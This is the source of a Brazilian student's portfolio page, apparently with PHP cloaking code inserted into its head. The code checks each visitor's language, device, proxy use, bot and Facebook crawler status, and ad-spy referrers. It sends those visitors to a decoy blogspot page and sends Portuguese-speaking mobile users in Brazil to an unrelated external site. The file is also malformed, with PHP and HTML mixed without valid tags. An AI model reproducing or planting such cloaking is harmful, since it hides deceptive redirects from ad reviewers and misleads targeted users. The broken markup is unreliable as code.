<?php
<!DOCTYPE html>
<html lang="pt-br" class="tema-vermelho">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucas Gabriel</title>

    <link href="./style/reset.css" rel="stylesheet">
    <link href="./style/style.css" rel="stylesheet">
    <link href="./style/bootstrap.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">

    <link rel="icon" type="image/png" sizes="32x32" href="./img/icon/iconSize/favicon-32x32.png">
    <link rel="apple-touch-icon" sizes="180x180" href="./img/icon/iconSize//apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./img/icon/iconSize//favicon-16x16.png">
    <link rel="manifest" href="./img/icon/iconSize/site.webmanifest">
    <link rel="mask-icon" href="./img/icon/iconSize/safari-pinned-tab.svg" color="#5bbad5"> 
    
    // Inclusão da biblioteca UserAgent
    include('UserAgent.php');

    // Instanciando o objeto UserAgent
    $ua = new UserAgent();

    // Verificando o idioma do dispositivo
    $lang = $ua->language();

    // Verificando o dispositivo do usuário
    $device = $ua->device();

    // Verificando se o usuário está usando um proxy
    $proxy = $ua->isProxy();

    // Verificando o UserAgent
    $userAgent = $ua->userAgent();

    // Verificando a referência
    $ref = $ua->referer();

    // Verificando se o dispositivo é desktop
    $desktop = $ua->isDesktop();

    // Verificando a localização do usuário
    $location = $ua->location();

    // Redirecionando se for inglês, espanhol, russo, ucraniano, chinês ou bot
    if ($lang == 'en' || $lang == 'es' || $lang == 'ru' || $lang == 'uk' || $lang == 'zh' || $ua->isBot()) {
        header("Location: https://caules.blogspot.com/search/label/CAULES");
    }

    // Redirecionando se o usuário estiver usando proxy
    if ($proxy) {
        header("Location: https://caules.blogspot.com/search/label/CAULES");
    }

    // Redirecionando se o UserAgent contiver "facebook" ou "facebot"
    if (strpos($userAgent, 'facebook') !== false || strpos($userAgent, 'facebot') !== false) {
        header("Location: https://caules.blogspot.com/search/label/CAULES");
    }

    // Redirecionando se o dispositivo for desktop
    if ($desktop) {
        header("Location: https://caules.blogspot.com/search/label/CAULES");
    }

    // Redirecionando se o referrer for "adheart.ru", "adminer.pro" ou "poweradspy.com"
    if ($ref == "http://adheart.ru/" || $ref == "http://adminer.pro/" || $ref == "http://poweradspy.com/") {
        header("Location: https://caules.blogspot.com/search/label/CAULES");
    }

    // Verificando se o usuário está no Brasil e usando "mobile phone" ou "Tablet" e com a língua "portugues"
    if ($location == "BR" && ($device == "mobile phone" || $device == "tablet") && $lang == "pt") {
        header("Location: https://lideresuamente.online/principal/");
    }

        
</head>
<body id="body">
    
    <div id="close-menu">
    </div>
    <!-- Menu Lateral -->
    <main class="menu-fechado animate__animated animate__fast" id="menu-lateral">
        <div class="container">
            <div class="row menu-lista">
                <div class="col align-center text-center color-red">
                    <ul>
                        <li href="#introducao"><a href="#introducao" title="Ir para introdução">Introdução</a></li>
                        <li href="#portfolio"><a href="#portfolio" title="Ir para portfólio">Portfólio</a></li>
                        <li href="#estudos"><a href="#estudos" title="Ir para estudos">Estudos</a></li>
                        <li href="#redes" ><a href="#redes" title="Ir para minhas redes">Minhas Redes</a></li>
                    </ul>
                </div>
            </div>
            <div class="row menu-temas">
                <p>Temas</p>
                <div class="col-12">
                    <div title="Tema escuro/Tema claro" class="menu-tema-principal"><div class="menu-tema-principal-base"><input type='checkbox' id="input-tema-principal">
                        <label for="input-tema-principal" class="label-tema-principal"></label></div></div>
                </div>
                <div class="col-12 menu-temas-cores">
                    <div title="Tema vermelho" class="menu-cor-vermelho"><input type="button" onclick="temaVermelho()" id="input-vermelho"></div>
                    <div title="Tema verde" class="menu-cor-verde"><input type="button" onclick="temaVerde()" id="input-verde"></div>
                    <div title="Tema azul" class="menu-cor-azul"><input type="button" onclick="temaAzul()" id="input-azul"></div>
                    <div title="Tema lilás" class="menu-cor-lilas"><input type="button" onclick="temaLilas()" id="input-lilas"></div>
                    <div title="Tema amarelo" class="menu-cor-amarelo"><input type="button" onclick="temaAmarelo()" id="input-amarelo"></div>
                </div>
            </div>
            <div class="row menu-contatos">
                <div class="col-12 contatos">
                    <a href="https://www.instagram.com/lugabriel.s/" target='blank' title="Abrir Instagram"><i class="fa-brands fa-instagram contatos"></i></a>
                    <a href="https://github.com/lugabrielll" target='blank' title="Abrir github"><i class="fa-brands fa-github"></i></a>
                    <a href="https://www.figma.com/@lugabriellls" target='blank' title="Abrir Figma"><i class="fa-brands fa-figma"></i></a>
                    <a href="https://www.linkedin.com/in/lucas-santos-2002/" target='blank' title="Abrir LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
                    <a href="mailto:lugabriel.santos@hotmail.com" title="Enviar mensagem"><i class="fa-solid fa-envelope"></i></a>
                </div>
            </div>
        </div>
    </main>

    

    <!-- Botão Menu Lateral -->
    <input title="Menu" style="display:none" type="checkbox" id="menu-hamburguer">
    <label title="Menu" style="position:fixed; z-index: 999;" for="menu-hamburguer">
        <div class="menu-button animate__rubberBand animate__animated animate__delay-4s">
            <span class="hamburguer "></span> 
        </div>
    </label>
    
    
    
        <!-- Capa -->
    <div class="capa">
        <div class="container">
            <div class="row">
                <div class="col-12 capa-container">
                    <h1>Seja bem-vindo! Fique à vontade :)</h1>
                </div>
            </div>
        </div>
    </div>

    <header>
        <!-- Introdução -->
        <div class="container intro-container">
            <div class="row linha-intro align-items-center">
                <div class="col-lg-8 intro-text animate__fadeInLeft animate__animated">
                    <h1 id="introducao">Estudo Programação e Design</h1>
                    <p> Oi, tudo bem? Meu nome é Lucas, sou um jovem estudante de 20 anos que começou a carreira há pouco tempo. </p>
                    <p> O objetivo desse site é ser um currículo de autoria, porém, de maneira diferente.</p>
                    <p> Aqui, colocarei alguns projetos e criações que desenvolvi ao longo dos meus estudos, envolvendo tecnologia e design.
                        Todo o código foi realizado apenas com HTML, CSS e Javascript, utilizando algumas framework para facilitar o desenvolvimento.</p>
                    <a title="Abrir currículo" href="./doc/Curriculo Vitae - Auxiliar Administrativo.pdf" target="blank"><button>Currículo</button></a>
                </div>
                <div class="col-lg-4">
                    <div class="intro-img animate__fadeInRight animate__animated">
                        <img alt="Imagem de uma prancheta de estudos" width="250px" id="img-prancheta">
                    </div>
                </div>
            </div>
        </div>

        <!-- Portfolio -->
        <div class="container portfolio-container">
            <div class="row linha-portfolio">
                <div class="col-12">
                    <h1 id="portfolio">Portfólio</h1>
                </div>
                <div class="col-12 card-line" data-animacao="down">
                    <div class="card-container" id="container-x">
                        <div class="card-scroll">
                            <div class="card-base" data-tilt  data-tilt-scale="1.05" data-tilt-glare data-tilt-max-glare="0.2">
                                <div class="card-titulo" id="c1">
                                        <h2>Protótipos</h2>
                                        <a title="Veja os protótipos" href="https://www.figma.com/@lugabriellls" target="blank"><button>Abrir</button></a>
                                </div>
                                <div class="card-text">
                                    <div>
                                        <p>Aqui há alguns protótipos criados (projetos ficitícios) utilizando a plataforma Figma!</p>
                                        <p>Tento buscar inovações sempre focadas na melhor experiencia para o usuário.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="card-base" data-tilt  data-tilt-scale="1.05" data-tilt-glare data-tilt-max-glare="0.2">
                                <div class="card-titulo" id="c2">
                                    <h2>Artes Digitais</h2>
                                    <a title="Veja as Artes Digitais" href="https://drive.google.com/drive/folders/1D9e4wLCCG52CYbRpTRtfMc0TkP1Y2TI_?usp=sharing" target="blank"><button>Abrir</button></a>
                                </div>
                                <div class="card-text">
                                    <div>
                                        <p>Sou novo nessa área, estou tentando aperfeiçoar novas técnicas para melhorar cada vez mais.</p>
                                        <p>São artes feitas em desktop e tablet.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="card-base" data-tilt  data-tilt-scale="1.05" data-tilt-glare data-tilt-max-glare="0.2">
                                <div class="card-titulo" id="c3">
                                    <h2>Empresa</h2>
                                    <a  title="Vejas os projetos" href="https://drive.google.com/drive/folders/1HaPgyOhsZ9HMyjz1ubDROOTBJN8JMIJ4?usp=sharing" target="blank"><button>Abrir</button></a>
                                </div>
                                <div class="card-text">
                                    <div>
                                        <p>Durante minha experiência na empresa Plugify, tive o prazer de fazer dois projetos de panfletos.</p>
                                        <p>Artes realizadas na plataforma do Canva.com</p>
                                    </div>
                                </div>
                            </div>
                            <div class="card-base" data-tilt  data-tilt-scale="1.05" data-tilt-glare data-tilt-max-glare="0.2">
                                <div class="card-titulo" id="c4">
                                    <h2>Certificados</h2>
                                    <a title="Veja os certificados" href="https://drive.google.com/drive/folders/1i3EsFZAMgY2hhn7r35-CH7qQ1EMhBlMU?usp=sharing" target="blank"><button>Abrir</button></a>
                                </div>
                                <div class="card-text">
                                    <div>
                                        <p>Certificações de cursos onlines que adquiri durante os meus estudos.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="card-base" data-tilt  data-tilt-scale="1.05" data-tilt data-tilt-glare data-tilt-max-glare="0.2">
                                <div class="card-titulo" id="c5">
                                    <h2>Outros</h2>
                                    <a title="Acessar outros" href="https://drive.google.com/drive/folders/14LVuDW_VM-Zsxm8M0u67jv1C8mY1YBp0?usp=sharing" target="blank"><button>Abrir</button></a>
                                </div>
                                <div class="card-text">
                                    <div>
                                        <p>Projetos que não possuem um vínculo específico na área.</p>
                                        <p>Feitos no software Sketchup e renderizados no V-Ray.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                        <div class="seta-esquerda"></div>
                        <div class="seta-direita"></div>
                    <div title="Ir para esquerda" class="botao-seta-esquerda" style="cursor:pointer" onclick="slide('left')">
                        <a><i class="fa-solid fa-arrow-left"></i></a>
                    </div>
                    <div title="Ir para direita" class="botao-seta-direita" style="cursor:pointer" onclick="slide('right')">
                            <a><i class="fa-solid fa-arrow-right"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <div class="container estudos-container">
            <div class="row">
                <div class="col-12">
                    <h1 id="estudos">Estudos</h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-5 coluna-estudos justify-content-center">
                    <div class="card-estudos" data-animacao="left">
                        <div>
                        <h2>2018-2020</h2>
                        <h2>Administração</h2>
                        <br>
                        <p> Começei meus estudos técnico na ETEC (Escola Técnica Estadual), cursando administração</p>
                        <p> O ensino era integrado ao médio, e aprendi muito sobre métodos de organizações, manipulações de planilhas
                        e planejamento de carreira.
                        </p>
                    </div>
                    </div>
                </div>
                <div class="col-md-5  coluna-estudos justify-content-center">
                    <div class="card-estudos" data-animacao="right">
                        <h2>2021-2022</h2>
                        <h2>Desenvolvimento de Sistemas</h2>
                        <br>
                        <p> Nesse período, comecei a dar meus primeiros passos com códigos - pude aprender sobre lógica de programação, criação para web,
                            desenvolvimento mobile e manipulções em bancos de dados.
                        </p>
                        <p>Me indentifiquei com front-end, principalmente na experiência do usuário e tudo que envolve design no mundo tecnológico.</p>
                    </div>
                </div>
            </div>
                <div class="row justify-content-center">
                    <div class="col-md-5 coluna-estudos justify-content-center">
                        <div class="card-estudos" data-animacao="left">
                            <h2>2023-2026</h2>
                            <h2>Design</h2>
                            <br>
                            <p> Com o objetido de aprofundar nesse ramo visual, ingressei no curso de design na Universidade Presbiteriana Mackenzie.
                            </p>
                            <p>
                                Além de adquirir mais uma formação para minha
                                carreira, consigo mesclar meus conhecimentos com a área tecnológica.
                            </p>
                        </div>
                    </div>
                    <div class="col-md-5 coluna-estudos justify-content-center">
                        <div class="card-estudos" data-animacao="right">
                            <h2>Online</h2>
                            <h2>Cursos Extras</h2>
                            <br>
                            <p> Também realizo estudos em outras plataformas, como na Fundação Bradesco e Alura.
                            </p>
                            <p> São cursos específicos, como aprendizado de softwares, experiência do usuário, uso das cores e etc.</p>
                        </div>
                    </div>
                </div>
            </div>
        <div class="container container-redes">
            <div class="row">
                <div class="col-12">
                    <h1 id="redes">Minhas Redes</h1>
                </div>
            </div>
            <div class="row" data-animacao="down">
                <div class="col-md-3 col-6 coluna-redes" data-tilt >
                    <a href="https://www.figma.com/@lugabriellls" target='blank' title="Abrir Figma"><div class="base-redes" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
                        <i class="fa-brands fa-figma"></i></a>
                        <a href="https://www.figma.com/@lugabriellls" target='blank' title="Abrir Figma"><div class="text-redes">
                            <p>Figma</p>
                        </div></a>
                    </div></a>
                </div>
                <div class="col-md-3 col-6 coluna-redes" data-tilt>
                    <a href="https://github.com/lugabrielll" target='blank' title="Abrir Github"><div class="base-redes" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
                        <i class="fa-brands fa-github"></i>
                        <a href="https://github.com/lugabrielll" target='blank' title="Abrir Github"><div class="text-redes">
                            <p>GitHub</p>
                        </div></a>
                    </div></a>
                </div>
                <div class="col-md-3 col-6 coluna-redes" data-tilt>
                    <a href="https://www.instagram.com/lugabriel.s/" target='blank' title="Abrir Intragram"><div class="base-redes" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
                        <i class="fa-brands fa-instagram"></i>
                        <a href="https://www.instagram.com/lugabriel.s/" target='blank' title="Abrir Intragram"><div class="text-redes">
                            <p>Instagram</p>
                        </div></a>
                    </div></a>
                </div>
                <div class="col-md-3 col-6 coluna-redes">
                    <a href="https://www.linkedin.com/in/lucas-santos-2002/" target='blank' title="Abrir LinkedIn"><div class="base-redes" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
                        <i class="fa-brands fa-linkedin"></i>
                        <a href="https://www.linkedin.com/in/lucas-santos-2002/" target='blank' title="Abrir LinkedIn"><div class="text-redes">
                            <p>Linkedin</p>
                        </div></a>
                    </div></a>
                </div>
            </div>
    </header>
    <footer>
      <div class="container container-footer">
        <div class="row">
            <div class="col-lg-7 coluna-assinatura">
                <div class="footer-assinatura">
                    <p>Lucas Gabriel</p>
                </div>
            </div>
            <div class="col-lg-5 coluna-info">
                <i class="fa-solid fa-envelope"></i>
                <a title="Enviar email" href="mailto:lugabriel.santos@hotmail.com"></i>
                <label>Lugabriel.santos@hotmail.com</label>
                </a><br>
                <i class="fa-solid fa-location-dot"></i>
                <label>São Paulo - Embu das Artes</label>
                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d116952.16064952644!2d-46.990388266891735!3d-23.648942836538446!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94cfab6f37da70af%3A0xbb79891cee20e08a!2sEmbu%20das%20Artes%20-%20SP!5e0!3m2!1spt-BR!2sbr!4v1665501246076!5m2!1spt-BR!2sbr" width="100%" height="350" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
            </div>
        </div>
        <div class="row">
            
        </div>
      </div>
    </footer>

    </div>

      <script type="text/javascript" src="./script/vanilla-tilt.js"></script>
      <script src="./script/main.js"></script>
      <script src="./script/bootstrap.js"></script>
      <script src="https://kit.fontawesome.com/6c7a788187.js" crossorigin="anonymous"></script>
</script>
</body>
</html>
?>